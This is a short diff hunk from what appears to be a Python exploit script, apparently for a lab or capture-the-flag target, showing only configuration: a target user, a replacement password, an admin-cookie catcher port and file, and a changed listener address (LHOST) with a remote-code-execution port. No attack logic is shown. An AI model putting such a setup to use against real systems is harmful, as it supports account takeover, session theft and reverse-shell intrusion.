@@ -6,7 +6,7 @@ TARGET_USER  = "user1"
 NEW_PASSWORD = "StudentiPobedjuju123!"
 COOKIE_PORT  = 8001
 COOKIE_FILE  = "admin_cookie.txt"
-LHOST        = "192.168.0.17"
+LHOST        = "10.248.9.109"
 RCE_PORT     = 9999
 
 session = requests.Session()
